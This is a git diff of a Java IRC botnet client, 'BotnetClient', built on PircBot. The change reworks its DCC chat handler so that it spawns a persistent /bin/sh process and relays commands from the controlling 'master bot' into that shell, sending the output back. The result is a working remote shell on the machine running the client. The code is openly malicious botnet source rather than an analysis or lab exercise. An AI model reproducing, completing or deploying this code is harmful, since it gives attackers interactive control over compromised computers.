@@ -74,15 +74,17 @@ public class BotnetClient extends PircBot {
 	
 
 	protected void onIncomingChatRequest(DccChat chatObj) {
+		if (chat == null) {
+			System.out.println("Chat failed, passed null.");
+		}
 		chat = new ChatThread(chatObj);
-	}
-	
-	public void write(String s) {
-		sendMessage(CHANNEL, s);
+		chat.start();
 	}
 	
 	private class ChatThread extends Thread {
+		private static final String SENTINEL = ":::END:::";
 		DccChat chat;
+		
 		public ChatThread(DccChat chat) {
 			this.chat = chat;
 			try {
@@ -94,41 +96,59 @@ public class BotnetClient extends PircBot {
 			} catch(Exception e) {
 				System.out.println(e.getMessage());
 			}
-			this.start();
 		}
+		
 		public void run() {
 			Runtime r = Runtime.getRuntime();
-			PrintWriter out = new PrintWriter(chat.getBufferedWriter());
 			try {
-	        	chat.sendLine("$: ");
-	        	String command = chat.readLine();
-	        	System.out.println("Command: " + command);
-	        	while (!command.equalsIgnoreCase("quit shell")) {
-	        		Process p = r.exec(command);
-	        		Scanner in = new Scanner(p.getInputStream());
-	        		p.waitFor();
-	        		String response = "";
-	        		while (in.hasNextLine()) {
-	        			response += in.nextLine() + "\n";
-	        		}
-	        		System.out.println(response);
-	        		out.print(response + "\n$: ");
-	        		command = chat.readLine();
-	        	}
+				//Create the bash shell
+				Process p = r.exec("/bin/sh");
+
+				//Gather the input/output stream to the bash shell process
+				PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
+				BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
+				
+				//Send input commands to the process in a separate thread
+				ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
+				inputThread.start();
+				
+				chat.sendLine("$: ");
+	        	//print the results only
+        		while (inputThread.isAlive()) {
+        			chat.sendLine("$: ");
+            		String s = bashout.readLine();
+            		System.out.println(s);
+	        		chat.sendLine(s);
+        		}
 	        	chat.close();
 		     } catch (Exception e) {
 		    	 e.printStackTrace();
 		     }
 		}
 	}
+	
+	//This class passes input from the chat object (the master bot) to the bash shell
+	public class ProcessInputThread extends Thread {
+	    private DccChat chat;
+	    private PrintWriter bashin;
+	    
+	    public ProcessInputThread(DccChat chat, PrintWriter writer) {
+	        this.chat = chat;
+	        bashin = writer;
+	    }
+
+	    public void run() {
+	    	try {
+	    		bashin.print("echo '$: '");
+		    	String command = chat.readLine() + "\n";
+	        	while (command != null && !command.equalsIgnoreCase("exit shell")) {
+	        		bashin.println(command);
+	        		command = chat.readLine() + "\n";
+	        	}
+	        	bashin.print("exit");
+	    	} catch (Exception e) {
+	            System.out.println(e.getMessage());
+	        }
+	    }
+	}
 }
-/*
-
-M' = enc(json(M, mac, nonce))
-M = de-json(dec(M'))
-
-*/
-
-
-
-
